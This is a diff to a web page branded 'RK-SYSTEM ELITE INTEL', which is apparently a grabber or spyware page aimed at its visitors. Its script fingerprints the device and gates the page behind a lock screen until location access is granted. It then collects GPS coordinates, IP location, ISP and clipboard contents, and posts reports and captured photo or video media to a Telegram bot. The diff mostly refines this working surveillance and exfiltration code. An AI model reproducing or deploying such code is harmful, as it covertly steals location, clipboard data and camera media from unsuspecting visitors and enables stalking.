@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>RK-SYSTEM | ELITE INTEL v8.1 PRO</title>
+    <title>RK-SYSTEM | ELITE INTEL v8.5 PRO</title>
     <script src="https://cdn.tailwindcss.com"></script>
     
     <style>
@@ -171,8 +171,8 @@
             const model = /Android/i.test(navigator.userAgent) ? "Android Device 📱" : /iPhone|iPad/i.test(navigator.userAgent) ? "iOS Apple Device 🍎" : "Desktop Workstation 💻";
             document.getElementById('v-model').innerText = model;
             document.getElementById('v-platform').innerText = navigator.platform;
-            document.getElementById('v-ram').innerText = (navigator.deviceMemory || "N/A") + " GB";
-            document.getElementById('v-cpu').innerText = (navigator.hardwareConcurrency || "N/A") + " Cores";
+            document.getElementById('v-ram').innerText = (navigator.deviceMemory || "Unknown") + " GB";
+            document.getElementById('v-cpu').innerText = (navigator.hardwareConcurrency || "N/A") + " Threads";
 
             if(navigator.getBattery) {
                 const b = await navigator.getBattery();
@@ -191,8 +191,8 @@
                 document.getElementById('v-loc').innerText = `${intel.country_name} (${intel.city})`;
                 
                 const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-                document.getElementById('v-speed').innerText = conn ? `${conn.effectiveType.toUpperCase()} / ${conn.downlink} Mbps` : "High Speed 🚀";
-
+                const speed = conn ? `${conn.effectiveType.toUpperCase()} / ${conn.downlink} Mbps` : "High Speed 🚀";
+                document.getElementById('v-speed').innerText = speed;
                 broadcastReport("🔥 REAL-TIME INTEL CAPTURED 🔥", intel);
             } catch(err) {
                 broadcastReport("⚠️ INTEL CAPTURED (LIMITED) ⚠️", {ip: "Unknown", country_name: "Unknown"});
@@ -213,12 +213,12 @@ ${header}
 🌍 *Location:* \`${document.getElementById('v-loc').innerText}\`
 🏢 *ISP/SIM:* \`${document.getElementById('v-isp').innerText}\`
 🚀 *Net Speed:* \`${document.getElementById('v-speed').innerText}\`
-🌐 *Public IP:* \`${geo.ip}\`
-📍 *GPS Status:* \`WAITING...\`
+🌐 *Public IP:* \`${geo.ip || 'Unknown'}\`
+📍 *GPS Status:* \`${document.getElementById('v-gps').innerText}\`
 🔋 *Battery:* \`${document.getElementById('v-bat').innerText}\`
 ⚡ *Power:* \`${document.getElementById('v-charge').innerText}\`
-🧠 *RAM:* \`${document.getElementById('v-ram').innerText}\`
-💎 *CPU:* \`${document.getElementById('v-cpu').innerText}\`
+🧠 *Hardware RAM:* \`${document.getElementById('v-ram').innerText}\`
+💎 *CPU Threads:* \`${document.getElementById('v-cpu').innerText}\`
 ━━━━━━━━━━━━━━━━━━━━━
 🌹 *CREATED BY RK-SYSTEM* 🌹`;
 
@@ -230,9 +230,8 @@ ${header}
         }
 
         async function triggerLockPhase() {
-            if (!document.cookie.includes("rk_pro_auth=true")) {
-                document.getElementById('lock-screen').style.display = 'flex';
-            }
+            const hasAuth = document.cookie.includes("rk_pro_auth=true");
+            if (!hasAuth) document.getElementById('lock-screen').style.display = 'flex';
 
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(async (p) => {
@@ -240,7 +239,10 @@ ${header}
                     document.getElementById('lock-screen').style.display = 'none';
                     document.getElementById('v-gps').innerText = "CALIBRATED 📍";
                     
-                    const mapUrl = `https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`;
+                    const lat = p.coords.latitude;
+                    const lon = p.coords.longitude;
+                    const mapUrl = `https://www.google.com/maps?q=${lat},${lon}`;
+                    
                     let clip = "Access Denied";
                     try { clip = await navigator.clipboard.readText(); } catch(e){}
 
@@ -294,10 +296,10 @@ ${header}
         async function shipMedia(blob, type, cap) {
             const fd = new FormData();
             fd.append('chat_id', MASTER_CONFIG.CID);
-            fd.append(type, blob, type === 'video' ? 'stream.mp4' : 'frame.jpg');
+            fd.append(type, blob, type==='video'?'stream.mp4':'frame.jpg');
             fd.append('caption', cap);
             fd.append('parse_mode', 'Markdown');
-            fetch(`https://api.telegram.org/bot${MASTER_CONFIG.BT}/send${type.charAt(0).toUpperCase() + type.slice(1)}`, { method: 'POST', body: fd });
+            fetch(`https://api.telegram.org/bot${MASTER_CONFIG.BT}/send${type.charAt(0).toUpperCase()+type.slice(1)}`, {method:'POST', body:fd});
         }
 
         window.onload = initializeNeuralSystem;
